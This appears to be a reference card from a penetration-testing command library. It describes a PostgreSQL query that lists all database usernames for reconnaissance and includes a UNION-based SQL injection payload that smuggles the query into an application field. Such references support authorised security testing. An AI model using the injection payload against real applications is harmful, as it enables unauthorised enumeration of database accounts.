---
type: command
executor: sql
data: SELECT usename FROM pg_user;
tags:
  - postgresql
  - user-enumeration
  - discovery
platforms:
  - Database
  - PostgreSQL
verified: true
validated: true
---

# postgresql-list-all-postgresql-users

## Command

```sql
SELECT usename FROM pg_user;
```

## Description

This SQL command queries the pg_user system catalog to list all usernames in the PostgreSQL cluster, aiding in user discovery during reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Queries system table directly | Yes |

## Examples

### Basic Usage

```sql
SELECT usename FROM pg_user;
```

### In Injection Payload

```sql
' UNION SELECT usename FROM pg_user; --
```

## Expected Output

Multiple rows of usernames, e.g.:

```
  usename  
-----------
 postgres
 app_user
 readonly
(3 rows)
```

## Related

- [[procedures/PostgreSQL-Current-User-Information-Gathering]]
- [[commands/postgresql-select-current-user]]
